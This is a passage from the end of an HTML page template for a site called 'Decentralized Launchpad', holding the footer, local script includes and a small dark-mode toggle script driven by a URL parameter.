                                </ul>
                            </div>
                        </div>
                    </div>
                    <hr class="uk-margin-medium uk-margin-3xlarge-top@m">
                    <div class="uk-panel uk-text-small">
                        <div class="uk-grid uk-child-width-auto@m uk-flex-center uk-flex-between@m uk-text-center uk-text-left@m" data-uk-grid>
                            <div>
                                <ul class="uk-subnav uk-subnav-small uk-text-muted uk-flex-center">
                                    <li><a href='/html/nerko/main/privacy'>Privacy policy</a></li>
                                    <li><a href='/html/nerko/main/terms'>Terms of use</a></li>
                                    <li class="uk-margin-small-left">
                                        <a href="#" data-uk-totop="" data-uk-scroll><i class="uk-icon uk-icon-small unicon-chevron-up"></i></a>
                                    </li>
                                </ul>
                            </div>
                            <div class="uk-flex-first@m uk-flex-center">
                                <p class="uk-text-muted">© 2022 Decentralized Launchpad. All rights reserved.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>

        <!-- Footer end -->

        <!-- include scripts -->
        <script defer src="/assets/js/jquery.min.js"></script>
        <script defer src="/assets/js/swiper-bundle.min.js"></script>
        <script defer src="/assets/js/feather.min.js"></script>
        <script defer src="/assets/js/typed.min.js"></script>
        <script defer src="/assets/js/anime.min.js"></script>
        <script defer src="/assets/js/app.js"></script>
        <script defer src="/assets/js/data-attr-helper.js"></script>
        <script defer src="/assets/js/swiper-helper.js"></script>
        <script defer src="/assets/js/typed-helper.js"></script>
        <script defer src="/assets/js/anime-helper.js"></script>

        <!-- <script defer src="/assets/js/anime-helper-defined-timelines.js"></script> -->
        <script>
            // Schema toggle via URL
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            const getSchema = urlParams.get("schema");
            if (getSchema === "dark") {
                document.documentElement.classList.add("uk-dark");
                localStorage.setItem("darkMode", "1");
            } else if (getSchema === "light") {
                document.documentElement.classList.remove("uk-dark");
                localStorage.setItem("darkMode", "0");
            }
        </script>
    </body>
</html>
